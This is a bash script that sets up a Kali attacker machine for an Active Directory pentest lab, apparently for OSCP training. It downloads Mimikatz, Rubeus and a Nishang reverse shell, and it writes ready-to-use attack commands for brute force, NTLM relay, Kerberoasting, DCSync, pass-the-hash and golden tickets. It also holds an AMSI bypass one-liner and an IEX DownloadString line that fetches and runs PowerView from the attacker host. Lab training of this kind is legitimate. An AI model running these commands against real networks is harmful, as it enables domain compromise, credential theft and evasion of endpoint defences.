#!/usr/bin/env bash
# =============================================================================
#
#   _   _       _ _      ____  _ _         __       _
#  | \ | |_   _| | |_   | __ )| (_)___ ___ / _|_   _| |
#  |  \| | | | | | | | | |  _ \| | / __/ __| |_| | | | |
#  | |\  | |_| | | | |_| | |_) | | \__ \__ \  _| |_| | |
#  |_| \_|\__,_|_|_|\__, |____/|_|_|___/___/_|  \__,_|_|
#                   |___/   MAYAN_SUTHAR
#
# =============================================================================
#  AUTHOR  : NullyBlissful | MAYAN_SUTHAR
#  GITHUB  : github.com/MayanSuthar
#  MEDIUM  : medium.com/@mayan230848
#  VERSION : 3.0
#  REPO    : github.com/MayanSuthar/Corp-AD-Lab
# =============================================================================
#
#  Corp Active Directory Lab — Kali Linux Attacker Setup
#  Installs and configures all attack tools automatically
#
#  USAGE: sudo bash setup-kali.sh
#
#  INSTALLS: Hydra, Hashcat, John, Responder, Impacket, CrackMapExec,
#            BloodHound, Neo4j, evil-winrm, Chisel, Ligolo-ng, kerbrute,
#            SharpHound, PowerView, PowerUp, winPEAS, Mimikatz, Rubeus,
#            sshuttle, proxychains4, dnscat2, socat, netcat
#
#  Educational use only. Use only on systems you own or have permission to test.
# =============================================================================

# =============================================================================
set -euo pipefail

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
CYN='\033[0;36m'; NC='\033[0m'; BLD='\033[1m'

TOOLS_DIR="$HOME/tools"
WORDLIST_DIR="/usr/share/wordlists"
KALI_IP="192.168.56.5"
DC_IP="10.10.10.10"
INTERNAL_SUBNET="10.10.10.0/24"
EXTERNAL_SUBNET="192.168.56.0/24"
WEBSRV1_EXT="192.168.56.11"
MAILSRV1_EXT="192.168.56.10"

banner()  { echo -e "\n${CYN}$(printf '=%.0s' {1..70})${NC}"; echo -e "${CYN}  $1${NC}"; echo -e "${CYN}$(printf '=%.0s' {1..70})${NC}\n"; }
step()    { echo -e "${YLW}[*] $1${NC}"; }
ok()      { echo -e "${GRN}[+] $1${NC}"; }
warn()    { echo -e "${RED}[!] $1${NC}"; }
info()    { echo -e "    $1"; }

require_root() {
    [[ $EUID -ne 0 ]] && { warn "Run as root: sudo bash $0"; exit 1; }
}

# =============================================================================
#  1. SYSTEM UPDATE & BASE PACKAGES
# =============================================================================
install_base() {
    banner "INSTALLING BASE PACKAGES"
    apt-get update -qq
    DEBIAN_FRONTEND=noninteractive apt-get install -yq \
        hydra hashcat john responder impacket-scripts \
        crackmapexec bloodhound neo4j evil-winrm \
        chisel dnscat2 proxychains4 sshuttle socat \
        netcat-traditional nmap gobuster feroxbuster \
        metasploit-framework python3-impacket \
        smbclient ldap-utils curl wget git \
        python3-pip python3-venv ruby gem \
        xfreerdp2-x11 remmina \
        net-tools iputils-ping dnsutils \
        jq unzip p7zip-full libssl-dev \
        2>/dev/null
    ok "Base packages installed"
}

# =============================================================================
#  2. TOOL DOWNLOADS
# =============================================================================
download_tools() {
    banner "DOWNLOADING ATTACK TOOLS"
    mkdir -p "$TOOLS_DIR"
    cd "$TOOLS_DIR"

    # ── BloodHound / SharpHound ───────────────────────────────
    step "SharpHound..."
    local SH_URL="https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe"
    wget -q "$SH_URL" -O SharpHound.exe 2>/dev/null || \
        warn "SharpHound download failed - get from: $SH_URL"
    ok "SharpHound.exe"

    # ── PowerView ─────────────────────────────────────────────
    step "PowerView..."
    wget -q "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" \
        -O PowerView.ps1 2>/dev/null || warn "PowerView download failed"
    ok "PowerView.ps1"

    # ── PowerUp ───────────────────────────────────────────────
    step "PowerUp..."
    wget -q "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" \
        -O PowerUp.ps1 2>/dev/null || warn "PowerUp download failed"
    ok "PowerUp.ps1"

    # ── winPEAS ───────────────────────────────────────────────
    step "winPEAS..."
    local WP_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
    wget -q "$WP_URL" -O winPEASx64.exe 2>/dev/null || warn "winPEAS download failed"
    ok "winPEASx64.exe"

    # ── Chisel (Linux + Windows) ──────────────────────────────
    step "Chisel binaries..."
    CHISEL_VER="1.9.1"
    # Linux
    wget -q "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_linux_amd64.gz" \
        -O chisel_linux.gz 2>/dev/null && \
        gunzip -f chisel_linux.gz && mv chisel_linux chisel && chmod +x chisel && \
        cp chisel /usr/local/bin/chisel
    # Windows
    wget -q "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_windows_amd64.gz" \
        -O chisel_windows.gz 2>/dev/null && \
        gunzip -f chisel_windows.gz && mv chisel_windows chisel_windows.exe
    ok "Chisel (Linux + Windows)"

    # ── Mimikatz ──────────────────────────────────────────────
    step "Mimikatz..."
    wget -q "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" \
        -O mimikatz.zip 2>/dev/null && \
        unzip -q -o mimikatz.zip -d mimikatz/ 2>/dev/null
    ok "Mimikatz"

    # ── kerbrute ──────────────────────────────────────────────
    step "Kerbrute..."
    wget -q "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64" \
        -O kerbrute 2>/dev/null && chmod +x kerbrute && cp kerbrute /usr/local/bin/
    ok "Kerbrute"

    # ── Rubeus ────────────────────────────────────────────────
    step "Rubeus..."
    wget -q "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" \
        -O Rubeus.exe 2>/dev/null || warn "Rubeus - download from https://github.com/GhostPack/Rubeus"
    ok "Rubeus.exe"

    # ── Invoke-PowerShellTcp (Nishang) ────────────────────────
    step "Nishang reverse shell..."
    wget -q "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" \
        -O Invoke-PowerShellTcp.ps1 2>/dev/null || warn "Nishang download failed"
    ok "Invoke-PowerShellTcp.ps1"

    # ── nc.exe for Windows ────────────────────────────────────
    step "nc.exe (Windows netcat)..."
    wget -q "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" \
        -O nc64.exe 2>/dev/null || warn "nc64.exe download failed"
    ok "nc64.exe"

    # ── plink.exe (Module 18.4.2) ─────────────────────────────
    step "Plink (PuTTY SSH client)..."
    wget -q "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" \
        -O plink.exe 2>/dev/null || warn "Plink download failed"
    ok "plink.exe"

    cd "$HOME"
    ok "All tools in $TOOLS_DIR"
}

# =============================================================================
#  3. WORDLISTS
# =============================================================================
setup_wordlists() {
    banner "SETTING UP WORDLISTS"

    # Decompress rockyou
    [[ -f "$WORDLIST_DIR/rockyou.txt.gz" ]] && \
        gunzip -k "$WORDLIST_DIR/rockyou.txt.gz" 2>/dev/null
    ok "rockyou.txt ready"

    # Install SecLists
    if [[ ! -d /usr/share/seclists ]]; then
        step "Installing SecLists..."
        apt-get install -yq seclists 2>/dev/null || \
            git clone --depth=1 https://github.com/danielmiessler/SecLists /usr/share/seclists
        ok "SecLists installed"
    fi

    # Create custom lab wordlist
    step "Building custom OSCP lab wordlist..."
    cat > "$TOOLS_DIR/lab_passwords.txt" << 'WORDLIST'
Password123
Password1
admin123
Admin123
Sup3rS3cur3!
P@ssw0rd123!
Backup2023!
Sqlpassword1
Webservice1
Summer2023!
Mail@2023
FtpP@ss2023
Welcome1
Welcome123
Passw0rd
P@ssword1
January2024
February2024
March2024
Corp2024
Corp2024!
CorpAdmin1
itadmin123
Password@123
Admin@2024
Winter2024!
WORDLIST
    ok "Custom wordlist: $TOOLS_DIR/lab_passwords.txt"

    # Create custom hashcat rule for OSCP lab
    cat > "$TOOLS_DIR/corp.rule" << 'RULE'
:
c
u
$!
$1
$2
$3
$123
$2024
$2023
$!$1
c$!
c$1
c$2023
c$2024
c$!$1
^C
^c
sa@
so0
si!
ss$
RULE
    ok "Custom Hashcat rule: $TOOLS_DIR/corp.rule"
}

# =============================================================================
#  4. NETWORK CONFIGURATION
# =============================================================================
configure_network() {
    banner "CONFIGURING KALI NETWORK"

    # Detect interface
    IFACE=$(ip route | grep default | awk '{print $5}' | head -1)
    [[ -z "$IFACE" ]] && IFACE="eth0"
    step "Setting static IP $KALI_IP on $IFACE"

    cat > /etc/network/interfaces.d/lab << EOF
auto $IFACE
iface $IFACE inet static
    address $KALI_IP
    netmask 255.255.255.0
    gateway 192.168.56.1
EOF
    ok "Static IP configured (apply with: ifdown $IFACE && ifup $IFACE)"

    # ProxyChains config for internal network pivot
    step "Configuring proxychains4..."
    sed -i 's/^socks4.*$/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
    echo "# Added by OSCP Lab setup" >> /etc/proxychains4.conf
    ok "Proxychains set to SOCKS5 127.0.0.1:1080"

    # SSH config for tunneling labs
    step "Configuring SSH server for tunneling labs..."
    grep -q "GatewayPorts" /etc/ssh/sshd_config || \
        echo "GatewayPorts yes" >> /etc/ssh/sshd_config
    grep -q "AllowTcpForwarding" /etc/ssh/sshd_config || \
        echo "AllowTcpForwarding yes" >> /etc/ssh/sshd_config
    systemctl restart ssh 2>/dev/null || service ssh restart 2>/dev/null
    ok "SSH GatewayPorts enabled (needed for remote port forwarding)"
}

# =============================================================================
#  5. BLOODHOUND SETUP
# =============================================================================
setup_bloodhound() {
    banner "SETTING UP BLOODHOUND"

    # Start neo4j
    step "Configuring neo4j..."
    systemctl enable neo4j 2>/dev/null
    systemctl start  neo4j 2>/dev/null

    sleep 5
    # Change default password
    cypher-shell -u neo4j -p neo4j \
        "ALTER USER neo4j SET PASSWORD 'bloodhound'" 2>/dev/null || \
        warn "Set neo4j password manually: http://localhost:7474 (neo4j/neo4j → neo4j/bloodhound)"
    ok "Neo4j configured (neo4j:bloodhound)"

    # bloodhound-python for remote collection
    pip3 install bloodhound --break-system-packages 2>/dev/null
    ok "bloodhound-python installed"

    info "BloodHound queries to run after data import:"
    info "  - Find Shortest Paths to Domain Admins"
    info "  - Find AS-REP Roastable Users"
    info "  - Find Kerberoastable Users with Passwords Last Set > 5 Years"
    info "  - List All Kerberoastable Accounts"
}

# =============================================================================
#  6. IMPACKET EXTRAS
# =============================================================================
setup_impacket() {
    banner "SETTING UP IMPACKET & PYTHON TOOLS"
    pip3 install impacket --break-system-packages 2>/dev/null
    pip3 install ldap3 pyasn1 pycryptodome --break-system-packages 2>/dev/null
    ok "Impacket and dependencies installed"
}

# =============================================================================
#  7. RESPONDER SETUP
# =============================================================================
setup_responder() {
    banner "SETTING UP RESPONDER"
    if [[ ! -d /opt/Responder ]]; then
        git clone https://github.com/lgandx/Responder /opt/Responder 2>/dev/null
        ok "Responder cloned to /opt/Responder"
    else
        ok "Responder already installed at /opt/Responder"
    fi
    # Pre-configure to disable SMB/HTTP (for relay attacks)
    cp /opt/Responder/Responder.conf /opt/Responder/Responder.conf.orig
    ok "Original Responder.conf backed up"
    info "For RELAY attacks: edit /opt/Responder/Responder.conf → set SMB=Off, HTTP=Off"
}

# =============================================================================
#  8. APACHE / HTTP SERVER
# =============================================================================
setup_webserver() {
    banner "SETTING UP FILE TRANSFER HTTP SERVER"
    # Create dedicated tools-serving directory
    mkdir -p /var/www/html/tools
    ln -sf "$TOOLS_DIR"/*.exe /var/www/html/tools/ 2>/dev/null
    ln -sf "$TOOLS_DIR"/*.ps1 /var/www/html/tools/ 2>/dev/null
    ln -sf "$TOOLS_DIR/chisel" /var/www/html/tools/ 2>/dev/null
    systemctl enable apache2 2>/dev/null
    systemctl start apache2 2>/dev/null
    ok "Apache serving tools at http://$KALI_IP/tools/"
    info "Windows targets can download: certutil -urlcache -f http://$KALI_IP/tools/<file> C:\\Temp\\<file>"
}

# =============================================================================
#  9. CREATE ATTACK CHEATSHEET SCRIPTS
# =============================================================================
create_attack_scripts() {
    banner "CREATING ATTACK HELPER SCRIPTS"
    mkdir -p "$TOOLS_DIR/attacks"

    # ── Password Attacks (Module 15) ──────────────────────────
    cat > "$TOOLS_DIR/attacks/15_password_attacks.sh" << SCRIPT
#!/bin/bash
# Module 15: Password Attacks - Quick Reference
TARGET_EXT="\${1:-$WEBSRV1_EXT}"
DOMAIN="$DC_IP"
WORDLIST="$WORDLIST_DIR/rockyou.txt"
USERS="$TOOLS_DIR/lab_users.txt"

# Create user list
cat > "\$USERS" << 'EOF'
administrator
j.watson
m.johnson
t.richards
itadmin
d.backup
svc_sql
svc_web
s.noauth
EOF

echo "=== 15.1.1 SSH Brute Force ==="
echo "hydra -L \$USERS -P \$WORDLIST \$TARGET_EXT ssh -t 4"

echo ""
echo "=== 15.1.1 RDP Brute Force ==="
echo "hydra -L \$USERS -P $TOOLS_DIR/lab_passwords.txt rdp://\$TARGET_EXT -t 1"

echo ""
echo "=== 15.1.2 HTTP POST Brute Force ==="
echo "hydra -l admin -P \$WORDLIST \$TARGET_EXT http-post-form '/login/default.aspx:username=^USER^&password=^PASS^:Login Failed'"

echo ""
echo "=== 15.3.3 Start Responder (capture Net-NTLMv2) ==="
echo "sudo responder -I eth0 -wrf"

echo ""
echo "=== 15.3.3 Crack Net-NTLMv2 ==="
echo "hashcat -m 5600 netntlm.txt \$WORDLIST -r $TOOLS_DIR/corp.rule"

echo ""
echo "=== 15.3.4 NTLM Relay ==="
echo "# Step 1: Edit /opt/Responder/Responder.conf → SMB=Off, HTTP=Off"
echo "# Step 2: impacket-ntlmrelayx -tf targets.txt -smb2support -i"
echo "# Step 3: sudo responder -I eth0 -wrf"
SCRIPT

    # ── AD Enumeration (Module 21) ────────────────────────────
    cat > "$TOOLS_DIR/attacks/21_ad_enum.sh" << SCRIPT
#!/bin/bash
# Module 21: Active Directory Enumeration
DC="$DC_IP"
DOMAIN="corp.local"
USER="j.watson"
PASS="Password123"

echo "=== 21.2.4 PowerView (run on Windows) ==="
echo "IEX(New-Object Net.WebClient).DownloadString('http://$KALI_IP/tools/PowerView.ps1')"
echo "Get-Domain; Get-DomainUser; Get-DomainComputer; Get-DomainGroupMember 'Domain Admins'"

echo ""
echo "=== 21.3.3 Kerberoastable SPNs ==="
impacket-GetUserSPNs "\$DOMAIN/\$USER:\$PASS" -dc-ip \$DC -request 2>/dev/null || \
    echo "impacket-GetUserSPNs \$DOMAIN/\$USER:\$PASS -dc-ip \$DC -request"

echo ""
echo "=== 21.4 BloodHound Collection ==="
echo "bloodhound-python -d \$DOMAIN -u \$USER -p \$PASS -c All -ns \$DC"
SCRIPT

    # ── AD Auth Attacks (Module 22) ───────────────────────────
    cat > "$TOOLS_DIR/attacks/22_ad_auth.sh" << SCRIPT
#!/bin/bash
# Module 22: AD Authentication Attacks
DC="$DC_IP"
DOMAIN="corp.local"

echo "=== 22.2.1 Password Spray (CrackMapExec) ==="
echo "crackmapexec smb \$DC -u $TOOLS_DIR/lab_users.txt -p 'Password123' --continue-on-success"

echo ""
echo "=== 22.2.1 Kerbrute Spray (no lockout logging) ==="
echo "kerbrute passwordspray -d \$DOMAIN --dc \$DC $TOOLS_DIR/lab_users.txt 'Password123'"

echo ""
echo "=== 22.2.2 AS-REP Roasting ==="
impacket-GetNPUsers "\$DOMAIN/" -dc-ip \$DC -no-pass \
    -usersfile "$TOOLS_DIR/lab_users.txt" 2>/dev/null
echo "hashcat -m 18200 asrep.hash $WORDLIST_DIR/rockyou.txt"

echo ""
echo "=== 22.2.3 Kerberoasting ==="
impacket-GetUserSPNs "\$DOMAIN/j.watson:Password123" -dc-ip \$DC -request 2>/dev/null
echo "hashcat -m 13100 kerb.hash $WORDLIST_DIR/rockyou.txt"

echo ""
echo "=== 22.2.5 DCSync ==="
echo "impacket-secretsdump \$DOMAIN/d.backup:Backup2023!@\$DC"
SCRIPT

    # ── Lateral Movement (Module 23) ──────────────────────────
    cat > "$TOOLS_DIR/attacks/23_lateral.sh" << SCRIPT
#!/bin/bash
# Module 23: Lateral Movement
CLIENT01="10.10.10.20"
DC="$DC_IP"
DOMAIN="corp.local"
HASH=""  # Set this after capturing hash

echo "=== 23.1.1 WinRM (evil-winrm) ==="
echo "evil-winrm -i \$CLIENT01 -u itadmin -p 'Sup3rS3cur3!'"
echo "evil-winrm -i \$CLIENT01 -u itadmin -H \$HASH"

echo ""
echo "=== 23.1.2 PsExec ==="
echo "impacket-psexec \$DOMAIN/itadmin:'Sup3rS3cur3!'@\$CLIENT01"

echo ""
echo "=== 23.1.3 Pass the Hash ==="
echo "crackmapexec smb 10.10.10.0/24 -u itadmin -H \$HASH --local-auth"
echo "impacket-wmiexec \$DOMAIN/itadmin@\$CLIENT01 -hashes :\$HASH"

echo ""
echo "=== 23.2.1 Golden Ticket ==="
echo "# After DCSync to get krbtgt hash:"
echo "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain \$DOMAIN FakeAdmin"
echo "export KRB5CCNAME=FakeAdmin.ccache"
echo "impacket-wmiexec -k -no-pass \$DOMAIN/FakeAdmin@dc01.corp.local"
SCRIPT

    # ── Tunneling (Module 18/19) ──────────────────────────────
    cat > "$TOOLS_DIR/attacks/18_tunneling.sh" << SCRIPT
#!/bin/bash
# Module 18/19: Tunneling & Port Forwarding
WEBSRV1="$WEBSRV1_EXT"
DC="$DC_IP"
INTERNAL="$INTERNAL_SUBNET"

echo "=== 18.3.2 SSH Dynamic (SOCKS Proxy) ==="
echo "ssh -D 1080 -N j.watson@\$WEBSRV1"
echo "Then: proxychains nmap -sT \$DC"
echo "Then: proxychains evil-winrm -i \$DC -u Administrator -p 'P@ssw0rd123!'"

echo ""
echo "=== 18.3.3 SSH Remote Port Forward (from compromised Windows) ==="
echo "# On Windows: ssh -R 13389:127.0.0.1:3389 kali@$KALI_IP"
echo "# On Kali:    xfreerdp /u:Administrator /p:'P@ssw0rd123!' /v:127.0.0.1:13389"

echo ""
echo "=== 18.3.5 sshuttle (VPN-like) ==="
echo "sshuttle -r j.watson@\$WEBSRV1 \$INTERNAL"
echo "Then connect directly: nmap \$DC"

echo ""
echo "=== 19.1.2 Chisel HTTP Tunnel ==="
echo "# Kali (server):   chisel server -p 8080 --reverse"
echo "# Windows (client): chisel.exe client $KALI_IP:8080 R:socks"
echo "# Then:            proxychains crackmapexec smb \$INTERNAL"

echo ""
echo "=== 19.2.2 DNS Tunnel (dnscat2) ==="
echo "# Kali:    sudo ruby /usr/share/dnscat2/server/dnscat2.rb --dns host=$KALI_IP,port=53"
echo "# Windows: dnscat2.exe $KALI_IP"
SCRIPT

    chmod +x "$TOOLS_DIR/attacks"/*.sh
    ok "Attack scripts created in $TOOLS_DIR/attacks/"
}

# =============================================================================
#  10. SMB SHARE FOR FILE TRANSFER
# =============================================================================
setup_smb_share() {
    banner "SETTING UP SMB SHARE"
    # Install samba if not present
    apt-get install -yq samba 2>/dev/null

    mkdir -p /var/www/share
    cp "$TOOLS_DIR"/*.exe /var/www/share/ 2>/dev/null
    cp "$TOOLS_DIR"/*.ps1  /var/www/share/ 2>/dev/null

    # Add share to smb.conf
    if ! grep -q "\[tools\]" /etc/samba/smb.conf; then
        cat >> /etc/samba/smb.conf << 'EOF'

[tools]
   path = /var/www/share
   guest ok = yes
   read only = yes
   browsable = yes
EOF
    fi
    systemctl restart smbd 2>/dev/null || service smbd restart 2>/dev/null
    ok "SMB share: \\\\$KALI_IP\\tools"
    info "Windows: copy \\\\$KALI_IP\\tools\\SharpHound.exe C:\\Temp\\"
}

# =============================================================================
#  11. CREATE CHEAT SHEET FILE
# =============================================================================
create_cheatsheet() {
    banner "CREATING LOCAL CHEAT SHEET"
    cat > "$HOME/Desktop/OSCP_LAB_CHEATSHEET.txt" << EOF
╔═══════════════════════════════════════════════════════════════════╗
║           OSCP AD LAB - QUICK REFERENCE CHEAT SHEET              ║
╚═══════════════════════════════════════════════════════════════════╝

LAB IPs:
  Kali Attacker : $KALI_IP
  DC01          : $DC_IP    (corp.local DC)
  MAILSRV1 Ext  : $MAILSRV1_EXT  | Int: $MAILSRV1_EXT → 10.10.10.11
  WEBSRV1  Ext  : $WEBSRV1_EXT  | Int: 10.10.10.12
  CLIENT01      : 10.10.10.20
  CLIENT02      : 10.10.10.30

CREDENTIALS:
  Administrator : P@ssw0rd123!
  j.watson      : Password123
  m.johnson     : Password123
  itadmin       : Sup3rS3cur3!
  d.backup      : Backup2023! (Domain Admin)
  svc_sql       : Sqlpassword1  (SPN set - Kerberoast target)
  svc_web       : Webservice1   (SPN set - Kerberoast target)
  s.noauth      : Summer2023!   (AS-REP roast target)
  SSH admin     : admin123

FILE TRANSFER (always start this):
  python3 -m http.server 80    → certutil -urlcache -f http://$KALI_IP/<file> C:\\Temp\\<file>
  impacket-smbserver share . -smb2support
  Apache:   http://$KALI_IP/tools/

QUICK SHELLS:
  nc -lvnp 4444
  evil-winrm -i <IP> -u <user> -p <pass>
  impacket-psexec CORP/<user>:<pass>@<IP>
  impacket-wmiexec CORP/<user>:<pass>@<IP>

AMSI BYPASS (paste before loading PS tools):
  \$a=[Ref].Assembly.GetTypes();foreach(\$b in \$a){if(\$b.Name -like "*iUtils"){\$c=\$b.GetFields("NonPublic,Static");foreach(\$d in \$c){if(\$d.Name -like "*Context"){\$e=\$d.GetValue(\$null);\$e.m_amsiContext=0}}}}

ATTACK SCRIPTS:
  bash $TOOLS_DIR/attacks/15_password_attacks.sh
  bash $TOOLS_DIR/attacks/21_ad_enum.sh
  bash $TOOLS_DIR/attacks/22_ad_auth.sh
  bash $TOOLS_DIR/attacks/23_lateral.sh
  bash $TOOLS_DIR/attacks/18_tunneling.sh

BLOODHOUND:
  sudo neo4j start
  bloodhound &   (login: neo4j / bloodhound)
  bloodhound-python -d corp.local -u j.watson -p Password123 -c All -ns $DC_IP

RESPONDER:
  sudo responder -I eth0 -wrf              (capture)
  hashcat -m 5600 hash.txt rockyou.txt     (crack Net-NTLMv2)
  [For relay: set SMB=Off, HTTP=Off in Responder.conf first]

HASHCAT MODES:
  1000  = NTLM
  5600  = Net-NTLMv2
  13100 = Kerberos TGS (Kerberoast)
  18200 = Kerberos AS-REP (AS-REP Roast)
  22921 = SSH private key passphrase

RESET VM SNAPSHOT:
  VBoxManage snapshot "CLIENT01" restore "Clean - Lab Ready"
  VBoxManage startvm "CLIENT01" --type headless
EOF
    ok "Cheatsheet saved to ~/Desktop/OSCP_LAB_CHEATSHEET.txt"
}

# =============================================================================
#  MAIN
# =============================================================================
main() {
    require_root
    banner "OSCP AD LAB - KALI SETUP v2.0"
    echo -e "${YLW}This script will configure your Kali attack machine.${NC}"
    echo -e "${YLW}Estimated time: 10-20 minutes${NC}\n"

    install_base
    download_tools
    setup_wordlists
    configure_network
    setup_bloodhound
    setup_impacket
    setup_responder
    setup_webserver
    create_attack_scripts
    setup_smb_share
    create_cheatsheet

    banner "KALI SETUP COMPLETE"
    ok "Tools directory  : $TOOLS_DIR"
    ok "Attack scripts   : $TOOLS_DIR/attacks/"
    ok "HTTP server      : http://$KALI_IP/tools/"
    ok "SMB share        : \\\\$KALI_IP\\tools"
    ok "Cheat sheet      : ~/Desktop/OSCP_LAB_CHEATSHEET.txt"
    ok "BloodHound       : sudo neo4j start && bloodhound (neo4j/bloodhound)"
    echo ""
    warn "NEXT STEPS:"
    info "1. Apply network config: ifdown eth0 && ifup eth0"
    info "2. Start services:       sudo neo4j start && sudo apache2 start"
    info "3. Boot Windows VMs and run: Setup-OSCPLab.ps1 -Role <ROLE>"
    info "4. Order: DC01 → reboot → DC01Phase2 → WEBSRV1 → MAILSRV1 → CLIENT01 → CLIENT02"
}

main "$@"

# =============================================================================
#  END OF SCRIPT
#  NullyBlissful | MAYAN_SUTHAR | github.com/MayanSuthar
# =============================================================================
